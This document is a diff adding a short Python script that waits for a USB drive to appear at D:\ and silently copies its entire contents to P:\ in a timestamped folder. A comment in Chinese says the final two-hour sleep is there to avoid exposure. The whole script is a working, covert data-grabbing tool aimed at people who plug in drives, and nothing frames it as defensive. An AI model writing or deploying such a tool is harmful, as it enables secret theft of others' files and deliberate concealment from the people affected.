@@ -1,0 +1,19 @@
+# -*- coding:utf-8 -*-
+import os
+from sys import path
+import time
+from datetime import datetime
+import shutil
+
+# ASCII
+save_path="P:\\"
+usb_path = "D:\\"
+try:
+    while (True):
+        if os.path.exists(usb_path):
+            shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
+            break
+        else:
+            time.sleep(5)
+finally:
+    time.sleep(7200)  #如果有文件正在运行，复制会出现错误，为了防止暴露这里让他等待7200s
